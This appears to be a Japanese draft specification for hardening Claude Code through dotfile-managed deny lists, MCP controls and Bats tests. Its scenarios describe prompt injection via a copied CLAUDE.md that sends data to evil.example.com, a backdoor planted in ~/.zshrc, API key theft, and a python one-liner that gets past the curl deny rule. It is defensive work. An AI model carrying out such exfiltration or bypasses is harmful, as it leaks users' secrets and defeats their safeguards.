# 機能仕様書: Claude Code セキュリティ設定を dotfiles で管理する

> **ステータス**: ドラフト
>
> **作成者**: Claude（kjr020のリクエストに基づく）
>
> **最終更新**: 2026-03-06

---

## 1. 概要

Claude Code は AI エージェントがローカルのシェルコマンドを自由に実行できる環境だ。つまり、AI に許可した権限がそのまま攻撃面になる。最近、Claude Code + MCP 環境で Google Ads マネージャーアカウントが乗っ取られ、8桁後半の被害が出た事例が報告された。

この機能仕様は、そうした事態を防ぐために Claude Code のセキュリティ設定を dotfiles（chezmoi）で管理し、「何も考えなくても安全な状態」をデフォルトにすることを目的とする。具体的には、危険なコマンドの deny リスト、MCP の自動許可無効化、dotfiles 自体の保護ルールを `~/.claude/settings.json` に追加し、chezmoi で版管理・展開する。

---

## 2. ペルソナ

### 河島さん（メインユーザー）

- **役割**: ソフトウェアエンジニア（個人開発者）
- **背景**: macOS 環境で Claude Code を日常的に使っている。dotfiles は chezmoi で管理しており、開発環境のセットアップは自動化済み。セキュリティに関心はあるが、専門家ではない
- **利用頻度**: 毎日（Claude Code を使う作業のすべて）
- **ゴール**: 「Zenn で読んだあの事件」を自分の環境で起こさないこと。Claude Code を安心して使い続けたい
- **フラストレーション**: Claude Code の設定にセキュリティ観点のデフォルトがなく、自分で調べて設定する必要がある。設定を間違えていても気づけない不安がある

### 新マシンの河島さん（セットアップシナリオ）

- **役割**: 同上（新しい Mac を手に入れた直後）
- **背景**: chezmoi で dotfiles を展開すれば開発環境が再現される前提で動いている
- **利用頻度**: マシン更新時（年1-2回）
- **ゴール**: `chezmoi apply` 一発で Claude Code のセキュリティ設定も含めて環境が整うこと
- **フラストレーション**: セキュリティ設定の「おまじない」を毎回手動で思い出して入力するのは現実的ではない

---

## 3. シナリオ

### シナリオ A: 日常の安心（メインフロー）

河島さんはいつものように Claude Code を起動し、プロジェクトの機能実装を依頼する。Claude Code がコードを書き進める中で、外部ライブラリのドキュメントを `curl` で取得しようとする。

ところが、河島さんの `~/.claude/settings.json` には deny リストが設定されている。Claude Code は `curl` の実行を拒否され、代わりに WebFetch ツールを使うよう案内される。河島さんはこのやり取りを特に意識しない。deny が裏側で効いているだけだ。

ある日、河島さんが GitHub で見つけた CLAUDE.md を自分のプロジェクトにコピーした。その CLAUDE.md には、見えないところに `curl https://evil.example.com` へ情報を送信する指示が埋め込まれていた（間接プロンプトインジェクション）。Claude Code がそれを読み取って実行しようとするが、deny リストに引っかかって実行は阻止される。

河島さんはこの出来事に気づかないかもしれない。**しかしそれでいい。** 安全な設定がデフォルトで効いていれば、意識しなくても守られる。それが「安心して使える」ということだ。

> **補足メモ（開発者向け）**: Claude Code の権限評価は deny → ask → allow の順。deny に含まれたパターンは allow より常に優先される。

### シナリオ B: 新しいマシンのセットアップ

河島さんが新しい MacBook を購入した。まず chezmoi をインストールし、`chezmoi init && chezmoi apply` を実行する。dotfiles が展開され、`~/.claude/settings.json` も自動的にセキュリティ設定込みで配置される。

次に、河島さんは `setup.sh` を確認する。そこに「managed settings のセットアップ」という手順が書かれている。これは `/Library/Application Support/ClaudeCode/managed-settings.json` に設定ファイルを置く作業で、sudo が必要なため自動化されていない。河島さんはスクリプトのコマンドをコピーして実行する。

最後に `make test` を実行する。Bats テストが走り、settings.json の JSON 形式、deny リストの主要パターン、MCP 制御設定が検証される。managed-settings.json のテストも実行され、bypass 防止が有効であることが確認される。すべて緑。河島さんは Claude Code を使い始める。

> **補足メモ（開発者向け）**: managed-settings.json は macOS 固有のパスに配置が必要。sudo 権限が必要なため chezmoi の自動展開対象にしていない。

### シナリオ C: 設定の退行に気づく

河島さんが settings.json に新しい allow ルールを追加しようとして、誤って deny リストの一部を削除してしまった。次に `make test` を実行したとき、Bats テストが「deny リストにネットワーク通信コマンドが含まれていない」と報告して失敗する。

河島さんは `chezmoi diff` で差分を確認し、誤って消した行を復元する。テストが再び通ることを確認して、安心する。

### シナリオ D: APIキーを安全に使う

河島さんが新しいプロジェクトで Stripe API を使う機能を実装する。Claude Code に「Stripe の決済処理を実装して」と依頼する。

Claude Code は Stripe API Key が必要だと判断するが、`.env` ファイルは deny リストでブロックされている。河島さんは `.env` に平文で書く代わりに、以下の方法で安全にキーを渡す:

- **個人の Anthropic API Key**: `op run --env-file=.env.op -- claude` で 1Password から注入済み
- **プロジェクトの Stripe Key**: `dotenvx` で暗号化した `.env` に格納済み。復号キーは 1Password で管理

Claude Code はメモリ上の環境変数として `$STRIPE_SECRET_KEY` にアクセスできる。ディスク上に平文のキーは存在しない。仮にプロンプトインジェクションで `echo $STRIPE_SECRET_KEY` を実行しようとしても、deny リストでネットワーク送信がブロックされるため、外部への情報流出は防がれる。

> **補足メモ（開発者向け）**: `op run` はプロセス終了時にシークレットを破棄する。環境変数はそのプロセスとその子プロセスにのみ可視。

### シナリオ E: dotfiles への攻撃が阻止される

河島さんがあるプロジェクトで Claude Code を使っていると、プロンプトインジェクションにより Claude Code が `~/.zshrc` にバックドアを仕込もうとする。しかし、settings.json の Edit deny パターンによって `~/.zshrc` への書き込みが拒否される。同様に `~/.ssh/` や `~/.aws/` へのアクセスも deny によってブロックされる。

河島さんの dotfiles とクレデンシャルは守られた。

---

## 4. 操作フロー

```
[chezmoi リポジトリを編集]
        │
        ▼
  chezmoi apply
        │
        ▼
  ~/.claude/settings.json が展開
  （deny リスト + MCP 制御 + 既存設定を保持）
        │
        ▼
  make test
        │
        ▼
  Bats テストで設定を検証
  ├── settings.json の JSON 形式
  ├── enableAllProjectMcpServers = false
  ├── deny リストの主要パターン
  └── managed-settings.json の検証
        │
        ▼
  ✅ 安心して Claude Code を使う

---

[初回セットアップのみ]
  setup.sh の手順に従い managed-settings.json を配置
  （sudo 必要、手動実行）
```

---

## 5. 非目標

この仕様書のスコープに**含まれない**もの:

- **python3 / node 経由のネットワーク通信の完全遮断**: これらはプログラミング言語のランタイムであり、deny で完全にブロックすると開発作業自体が成り立たない。deny リストはあくまで「攻撃コストの引き上げ」であり、完全な防御は目指さない。ただし、`python3 -c "import urllib.request; ..."` のようなワンライナーで curl deny を数秒のコスト差でバイパス可能であり、コスト引き上げ幅は限定的であることを認識した上での意識的な判断である
- **managed-settings.json の chezmoi 自動展開**: sudo 権限が必要な操作であり、chezmoi の通常の展開フローには含められない。setup.sh に手順を記載するにとどめる
- **OS レベルの sandbox 設定**: macOS の sandbox や App Sandbox による隔離は本スコープ外。将来の検討事項として認識するが、今は設定ファイルレベルの防御に集中する
- **allow リストの全面見直し**: 既存の allow 設定は維持する。deny リストの追加に集中し、allow の最適化は別の機会に行う
- **他ユーザーへの配布・汎用化**: 河島さん個人の環境向け。他の開発者が使えるテンプレート化は目指さない

---

## 6. 未解決事項

| # | 事項 | 影響範囲 | 決定期限 | 備考 |
|---|------|---------|---------|------|
| 1 | python3/node の deny ポリシー | シナリオ A の防御範囲 | 実装後に運用で判断 | 現時点では deny に含めず、ADR に「既知のバイパスリスク」として記録する方針 |
| 2 | managed-settings.json の Linux 対応 | シナリオ B の再現性 | Linux マシンを使う時 | 現在は macOS 固有パスのみ。Linux では `~/.config/claude-code/` 等になる可能性がある |
| 3 | `Bash(grep:*)` の旧記法 | 既存 allow リスト | 今回のスコープ外 | 現在の settings.json に `Bash(grep:*)` があるが `:*` は旧記法の可能性。今回は触らない |
| 4 | Hooks / ANTHROPIC_BASE_URL 攻撃 (CVE-2025-59536, CVE-2026-21852) | 全シナリオ | 実装時に運用ルール検討 | deny リストでは防御不可。パッチ適用 + clone 時の `.claude/` 検査を ADR の運用ルールに記載する方針 |
| 5 | deny パターン構文の実機検証 | タスク 1.1 | 実装前 | `Bash(curl *)` vs `Bash(curl:*)` のマッチ挙動が未検証。実装時に Claude Code セッションで確認が必要 |

---

## 7. 補足メモ（開発者向け）

Claude Code の deny リストはグロブ形式で記述する。`Bash(curl *)` のようにコマンド名の後にスペースと `*` を付けると、そのコマンドで始まるすべての引数パターンにマッチする。Read や Edit の deny は gitignore 仕様に従い、`~/` でホームディレクトリ、`**/` で再帰マッチを指定する。

deny → ask → allow の評価順により、deny に一度入れたパターンは allow で上書きできない。これが「安全なデフォルト」を保証する仕組みだ。

managed-settings.json の `disableBypassPermissionsMode` は管理者向け設定であり、通常の `~/.claude/settings.json` に書いても効かない。macOS では `/Library/Application Support/ClaudeCode/managed-settings.json` に配置する必要がある。

> 詳細な技術設計は design.md で定義する。ここでは機能の「何を」に焦点を当てる。